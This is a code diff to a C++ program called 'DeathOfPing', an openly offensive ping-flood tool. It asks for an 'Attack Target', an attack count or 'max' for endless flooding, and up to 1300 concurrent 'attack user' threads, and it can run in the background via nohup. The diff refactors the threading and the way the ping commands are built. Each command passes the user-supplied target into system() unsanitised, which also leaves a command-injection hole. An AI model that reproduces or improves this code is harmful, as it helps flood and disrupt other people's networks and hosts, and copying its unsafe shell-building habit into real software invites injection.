@@ -19,22 +19,34 @@ private:
 public:
     DeathOfPing() = default;
 
+    void run_threads(int thread) {
+        std::vector<std::thread> threads;
+        for (int i = 0; i < thread; i++) {
+            threads.emplace_back([this, i] { attack(i); });
+        }
+        for (auto& thread : threads) {
+            thread.join();
+        }
+    }
+
     void attack(int i) {
         std::filesystem::path abs_path = std::filesystem::canonical(".");
-        string s = "ping " + target;
+        string s = "ping -c "+ to_string(number) + " " + target;
         if (isBackup) {
-            for (int i = 0; i < number; i++) {
-                if (execl("/bin/nohup", "nohup", "ping", target.c_str(),
-                          ">"+abs_path.string()+"/../nohup/"+ to_string(i)+".log","2>&1","&", nullptr) == -1) {
-                    perror("execl"); // handle error if execl fails
-                }
+            if (isAlways) {
+                s = "ping " + target;
+                string s_1 =
+                        "nohup " + s + " > /dev/null &";
+                system(s_1.c_str());
+            }else {
+                string s_1 =
+                        "nohup " + s + " > /dev/null &";
+                system(s_1.c_str());
             }
-        }
-        else {
-            for (int i = 0 ; i < number ;i++) {
-                if (execl("/bin/ping", "ping",target.c_str(), nullptr) == -1) {
-                    perror("execl"); // handle error if execl fails
-                }
+        }else {
+            if (isAlways) {
+                s = "ping " + target;
+                system(s.c_str());
             }
         }
     }
@@ -42,7 +54,9 @@ public:
     void Console() {
 
         target = input("Input Your Attack Target: ");
-        string n = input("Enter the amount of data for a single user attack [If you want to Attack all the time, Enter 'max'] : ");
+        string n = input(
+                "Enter the amount of data for a single user attack [If you want to Attack all the time, Enter 'max'] : "
+                );
         if (n == "max") {
             isAlways = true;
         }else {
@@ -54,18 +68,22 @@ public:
             }
         }
         try {
-            thread = stoi(input("Input all the attack user number: "));
-        }catch (const runtime_error& error) {
+            thread = stoi(input("Input all the attack user number: [1-1300] "));
+            if (thread > 1300 || thread < 1)
+            {
+                std::cerr << "Your Input Error. Break the options.";
+                return;
+            }
+        }catch (const runtime_error& error)
+        {
             std::cout << "[ERR] Your Input Error." << std::endl;
             return;
         }
         isBackup = input("Do you want run it in System background: [y or n] ") == "y";
 
         try {
-            std::vector<std::thread> threads;
-            for (int i =0 ; i<thread ;i++) {
-                threads.emplace_back([this, &i] { attack(i); });
-            }
+            cout << "\n" << endl;
+            run_threads(thread);
         }catch (const runtime_error& error) {
             std::cout << "[ERR] runtime Error." << std::endl;
             return;
